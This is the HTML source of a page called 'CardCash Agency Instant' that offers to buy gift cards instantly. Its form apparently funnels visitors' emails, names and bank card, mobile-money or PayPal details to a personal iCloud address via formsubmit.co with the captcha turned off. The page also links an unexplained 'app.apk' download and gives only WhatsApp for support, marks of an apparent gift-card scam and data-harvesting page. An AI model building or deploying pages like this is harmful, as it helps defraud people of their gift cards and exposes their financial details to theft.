<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CardCash Agency Instant</title>

<style>
body{
margin:0;
font-family:Arial;
text-align:center;
background:linear-gradient(180deg,#1d4ed8,#22c55e,#facc15,#f97316);
}

header{
background:#1d4ed8;
color:white;
padding:15px;
font-size:22px;
font-weight:bold;
position:relative;
}

.lang{
position:absolute;
right:10px;
top:10px;
}

.lang img{
width:35px;
margin-left:5px;
cursor:pointer;
}

h1{
color:white;
margin-top:20px;
}

.download{
display:inline-block;
background:#16a34a;
color:white;
padding:12px 20px;
border-radius:10px;
margin:15px;
font-size:18px;
text-decoration:none;
}

.cards img{
width:70px;
margin:10px;
}

.counter{
background:white;
padding:15px;
margin:20px;
border-radius:15px;
font-size:20px;
font-weight:bold;
color:#16a34a;
}

/* FORM */
form{
background:#f5f5f5;
margin:20px;
padding:18px;
border-radius:12px;
text-align:left;
}

.form-group{
margin-bottom:10px;
}

label{
font-size:12px;
font-weight:bold;
color:#1d4ed8;
display:block;
margin-bottom:4px;
}

input,select{
width:100%;
padding:10px;
border-radius:8px;
border:1px solid #ccc;
font-size:14px;
box-sizing:border-box;
}

.hidden{
display:none;
margin-top:8px;
}

button{
background:#16a34a;
color:white;
border:none;
padding:12px;
width:100%;
font-size:16px;
border-radius:10px;
cursor:pointer;
font-weight:bold;
}

footer{
background:#1d4ed8;
color:white;
padding:20px;
margin-top:20px;
}

.whatsapp{
position:fixed;
bottom:25px;
right:25px;
background:#25D366;
width:65px;
height:65px;
border-radius:50%;
display:flex;
align-items:center;
justify-content:center;
}

.whatsapp img{
width:32px;
}
</style>
</head>

<body>

<header>
CardCash Agency Instant
</header>

<h1>We buy your gift cards instantly</h1>

<a class="download" href="app.apk">Download App</a>

<div class="cards">
<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
<img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg">
<img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg">
</div>

<div class="counter">Over 1500 satisfied clients</div>

<h2>Sell your gift card</h2>
<p>10% commission</p>

<!-- FORM -->
<form action="https://formsubmit.co/fredrivera09@icloud.com" method="POST">

<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_subject" value="New Gift Card Request">
<input type="hidden" name="_template" value="table">

<!-- EMAIL -->
<div class="form-group">
<label>Email *</label>
<input type="email" name="email" placeholder="Enter your email" required>
</div>

<!-- NAME -->
<div class="form-group">
<label>Name</label>
<input type="text" name="name" placeholder="Enter your name">
</div>

<!-- PAYMENT -->
<div class="form-group">
<label>Payment method *</label>
<select id="payment" name="payment" onchange="showPayment()" required>
<option value="">Select</option>
<option value="orange">Orange Money</option>
<option value="momo">Mobile Money</option>
<option value="card">Bank Card</option>
<option value="paypal">PayPal</option>
</select>
</div>

<!-- ORANGE -->
<div id="orange" class="hidden">
<input type="text" name="orange_number" placeholder="Orange Money number">
</div>

<!-- MOMO -->
<div id="momo" class="hidden">
<input type="text" name="momo_number" placeholder="Mobile Money number">
</div>

<!-- CARD -->
<div id="card" class="hidden">
<input type="text" name="card_number" placeholder="Bank card number">
</div>

<!-- PAYPAL -->
<div id="paypal" class="hidden">
<input type="text" name="paypal" placeholder="PayPal link or email">
</div>



<button type="submit">SELL</button>

</form>

<footer>
WhatsApp Support: +13434473483
</footer>

<a class="whatsapp" href="https://wa.me/13434473483">
<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
</a>

<script>
function showPayment(){
let m=document.getElementById("payment").value;

document.getElementById("orange").style.display="none";
document.getElementById("momo").style.display="none";
document.getElementById("card").style.display="none";
document.getElementById("paypal").style.display="none";

if(m=="orange") document.getElementById("orange").style.display="block";
if(m=="momo") document.getElementById("momo").style.display="block";
if(m=="card") document.getElementById("card").style.display="block";
if(m=="paypal") document.getElementById("paypal").style.display="block";
}
</script>

<div id="google_translate_element"></div>

<script>
function googleTranslateElementInit() {
  new google.translate.TranslateElement({
    pageLanguage: 'en',
    includedLanguages: 'fr,en,de,es,pt,it,nl,zh-CN,ja,ko,ru,tr,ar',
    layout: google.translate.TranslateElement.InlineLayout.SIMPLE
  }, 'google_translate_element');
}

setTimeout(function(){
  var lang = navigator.language.substring(0,2);
  var select = document.querySelector(".goog-te-combo");
  if(select){
    select.value = lang;
    select.dispatchEvent(new Event("change"));
  }
},2000);
</script>

<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
</body>
</html>
